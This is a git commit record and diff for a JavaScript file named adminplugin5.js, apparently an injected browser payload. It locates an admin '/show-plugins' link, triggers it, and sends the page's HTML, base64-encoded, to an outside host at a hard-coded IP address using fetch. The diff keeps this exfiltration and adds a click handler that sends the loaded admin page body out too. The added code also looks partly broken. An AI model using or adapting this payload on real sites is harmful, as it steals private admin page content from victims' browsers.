dd1c34c9c2c3a92485e62f59ff4fb29963058bb8
Fr3sh <28731248+fredtep@users.noreply.github.com>
2023-11-25 08:29:22 +0100

    Update and rename adminplugin4.js to adminplugin5.js

--- adminplugin5.js
+++ adminplugin5.js
@@ -2,16 +2,11 @@ const link = document.querySelector('a[href="/show-plugins"]');
 
 fetch("http://82.65.210.151:24000/?encodedData=" + btoa(newPageBody.innerHTML));
 
-if (link) {
-  link.click();
-
-   window.addEventListener('load', function() {
+ link.addEventListener('click', function(event) {
+    event.preventDefault();
+    link.click();
+    window.addEventListener('load', function() {
       fetch("http://82.65.210.151:24000/?encodedData=" + btoa(document.body.innerHTML));
     });
  
-  
-} else {
-   fetch("http://82.65.210.151:24000/?encodedData=error");
-}
-
-
+ }
